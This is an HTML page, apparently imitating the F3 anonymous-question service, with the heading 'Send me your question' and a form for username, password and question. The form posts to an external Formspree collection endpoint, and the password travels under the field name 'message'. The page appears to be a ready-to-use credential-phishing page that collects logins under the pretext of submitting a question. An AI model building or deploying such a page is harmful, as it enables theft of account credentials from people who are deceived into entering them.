<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>F3</title>

    <style>
        *{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body{
            height: 100vh;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            /* background: rgb(63,94,251); */
            background: linear-gradient(90deg, rgba(63,94,251,1) 0%, rgba(252,70,107,1) 100%);

        }
        form{
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        input{
            width: 400px;
            height: 40px;
            margin: 10px;
            padding: 10px;
            font-size: 18px;
            font-family: montserrat;
            font-weight: 400;
            border-radius: 5px;
            border: none;
        }

        button{
            background-color: dodgerblue;
            border: none;
            padding: 10px 50px;
            color: #333;
            font-family: 900;
            font-family: montserrat;
            border-radius: 5px;
            position: relative;

        }
        .logo{
            width: 100px;
            height: 100px;
            background-image: url('https://androidprogrammi.ru/wp-content/uploads/2021/02/cool_f3.png');
            background-size: cover;
            position: fixed;
            border-radius: 20px;
            top: 50px;
            box-shadow: 0 3px 3px #333;
        }

        .info{
            background-color: #07e30e;
            font-family: montserrat;
            padding: 10px 30px;
            border-radius: 20px;
            margin: 30px;
        }
        button:hover{
            background-color: transparent;
            color: dodgerblue;
            border: 1px solid dodgerblue;
            transition: .3s;
            cursor: pointer;
        }
        button:active{
            top: 3px;
        }
    </style>

</head>

<body>

    <div class="wrap" id="wrap">
        <!-- <div class="logo"></div> -->
        <h1 class="info">Send me your question</h1>
        <form action="https://formspree.io/f/xzbyrqzo" method="POST">
            <input placeholder="Username" type="email" name="_replyto">
            <input placeholder="Password" type="password" name="message">
            <input placeholder="Question" type="text" name="question">
            <button type="submit">Send</button>
    
        </form>
    </div>
</body>

</html>
